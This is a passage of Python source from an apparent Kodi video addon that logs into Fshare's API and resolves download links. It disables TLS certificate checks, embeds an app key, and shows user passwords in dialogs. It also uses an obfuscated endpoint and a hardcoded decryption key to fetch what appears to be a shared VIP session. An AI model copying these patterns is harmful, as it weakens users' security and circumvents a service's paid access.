		return
def login_f():
	import requests
	checkAccFshare()
	username = ADDON.getSetting('fshare_username')
	password = ADDON.getSetting('fshare_password')
	payload = '{"app_key":"L2S7R6ZMagggC5wWkQhX2+aDi467PPuftWUMRFSn","user_email":"'+username+'","password":"'+password+'"}'
	headers = {'cache-control': "no-cache"}
	try:
		response = requests.post("https://118.69.164.19/api/user/login", data=payload, headers=headers,verify=False)
		jStr = json.loads(response.content)
		msg = jStr['msg']
		notify(msg)
		if 'fail' in msg:
			line = "Double check your username and password again:\n"
			line += "Username: [COLOR yellow]%s[/COLOR]\n" % username
			line += "Password: [COLOR yellow]%s[/COLOR]\n" % password
			alert(line,title="Fshare Account")
			ADDON.openSettings()
			return
		code = jStr['code']
		if response.status_code == 200:
			token = jStr['token']
			session_id = jStr['session_id']
			header = {'Cookie' : 'session_id=' + session_id}
			ADDON.setSetting(id="tokenfshare",value=token)
			ADDON.setSetting(id="sessionfshare",value=session_id)
			return (token,session_id)
	except:
		alert("Bạn nhập sai vui lòng kiểm tra lại.\nUsername: [COLOR yellow]%s[/COLOR]-Pass: [COLOR yellow]%s[/COLOR]" % (username,password))
		pass
	
def check_file_info(url):
	url = 'https://murmuring-fortress-18529.herokuapp.com/check_file.php?url=%s' % url
	r = urlfetch.get(url)
	status = re.search(r"status=(\d+)",r.body).group(1) 
	name = re.search(r"name=(.+)",r.body).group(1)
	name = name.replace(' - Fshare','')
	name=name.strip()
	return (status,name)
		
def get_file_info(url,session_id,token):
	data   = '{"token" : "%s", "url" : "%s"}' % (token,url)
	header = {'Cookie' : 'session_id=' + session_id}
	r = requests.post('https://118.69.164.19/api/fileops/get',headers=header,data=data, verify=False)
	regex = r"\"pwd\":(.+?),"
	match = re.search(regex,r.content)
	password = match.group(1)
	return password
def get_fshare(url):
	if len(url) == 12 or len(url) == 15:
		url = 'https://www.fshare.vn/file'+url
	
	url = url.replace('http://', 'https://')
	username = ADDON.getSetting('fshare_username')
	password = ADDON.getSetting('fshare_password')
	fshare_option = ADDON.getSetting('fshare_option')
	token = ADDON.getSetting('tokenfshare')
	session_id = ADDON.getSetting('sessionfshare')
	F = 'U2FsdGVkX1+oRjEcO06h18WuKSLFnniVhsVxR1l2aUWLmQAC3v4KfeXi5Xx5I11I'
	
	def check_user(session_id):
		
		import requests
		headers = {'cookie': "session_id="+session_id}
		response = requests.get("https://118.69.164.19/api/user/get", headers=headers,verify=False)
		jStr = json.loads(response.content)
		c = jStr['account_type']
		return(c)
		
					
			
	def fshare_download(url,session_id,token):
		import requests
		url =urllib.unquote(url)
		url = removeNonAscii(url)
		
		try:
			password1 = get_file_info(url,session_id,token)
		except:
			password1 = 'null'
			
		if password1 != 'null':
			keyboardHandle = xbmc.Keyboard('','Nhập mật khẩu bảo vệ của tập tin')
			keyboardHandle.doModal()
			if (keyboardHandle.isConfirmed()):
				queryText = keyboardHandle.getText()
				if len(queryText) == 0:
					return
				queryText = urllib.quote_plus(queryText)
				password1 = queryText
				
			else:
				return
		
		
		data   = '{"token" : "%s", "url" : "%s", "password" : "%s"}'
		header = {'Cookie' : 'session_id=' + session_id}
		data   = data % (token, url, password1)
		
		t = requests.post("https://118.69.164.19/api/session/download", headers=header, data=data, verify=False)
		#TextBoxes("VMF",t.content)
		jStr = json.loads(t.content)
		#Check file
		
		if '404' in t.content:
			notify("Tập tin không tồn tại")
			sys.exit()
		else:	
			vDialog.create('Fshare','Bắt đầu Play')
			video_url = jStr['location']
			video_url = convert_ipv4_url(video_url)
			if len(video_url) == 0:
				notify('Link hỏng')
			vDialog.close()
			
			return video_url	
	#+++++++++++++++++	
	if fshare_option == "true":
		if len(username) == 0  or len(password) == 0:
			alert(u'Bạn chưa nhập tài khoản cá nhân Fshare'.encode("utf-8"), 'Mua VIP, liên hệ [COLOR yellow]vietkodi@gmail.com[/COLOR]')
			return
		else:
			
			#Check valid file
			try:
				c = check_user(session_id)
				notify('Tài khoản của bạn là: '+str(c))
				video_url = fshare_download(url,session_id,token)
				if len(video_url)>0:
					return video_url
				
			except:
				notify("Try one more")
				token,session_id = login_f()
				video_url = fshare_download(url,session_id,token)
				if len(video_url)>0:
					return video_url
				else:alert("Không nhận được video link")
				
					
					
			
	if fshare_option == "false":	
		
		if len(ADDON.getSetting('fshare_username')) > 0 and len(ADDON.getSetting('fshare_password')) > 0:
			file_type, name = check_file_info(url)
			if file_type == '2':
				alert("Link này không có thực or đã bị xoá")
				sys.exit()
		if len(USER_VIP_CODE) == 0:
			alert(u'Bạn cần tài khoản Fshare Vip. Liên hệ vietkodi@gmail.com'.encode("utf-8"))
			return
		if len(USER_VIP_CODE) > 0:
			
			try:
				response = fetch_data((vmf.XvaYOy8Z4Djz(WcLeeL0vZik1('98888775512255778954','moCKaJt7pquBZIyij42Jq5KQh6SSj5GtmqSNZYFjpqiPfKKvhKd3o5x8caCRaomll2Nma4-jjaGZam5pm2uNdQ=='))))
				j = json.loads(response.body)
				session_id = j['username']
				t = vmf.gibberishAES(session_id, 'Faidemteiv')
				session_id,token = t.split('|')
				#vDialog.close()
				return fshare_download(url,session_id,token)
				
				
			except:
				try:
					#vDialog.create('Fshare','Chuẩn bị play...')
					response = fetch_data((vmf.XvaYOy8Z4Djz(WcLeeL0vZik1('98888775512255778954','moCKaJt7pquBZIyij42Jq5KQh6SSj5GtmqSNZYFjpqiPfKKvhKd3o5x8caCRaomll2Nma4-jjaGZam5pm2uNdQ=='))))
					j = json.loads(response.body)
					session_id = j['username']
					t = vmf.gibberishAES(session_id, 'Faidemteiv')
					session_id,token = t.split('|')
					#vDialog.close()
					return fshare_download(url,session_id,token)
				except:
					pass
					
			else:
				notify('Server error. Try again in 5 or 10 minutes.')
				
			
		


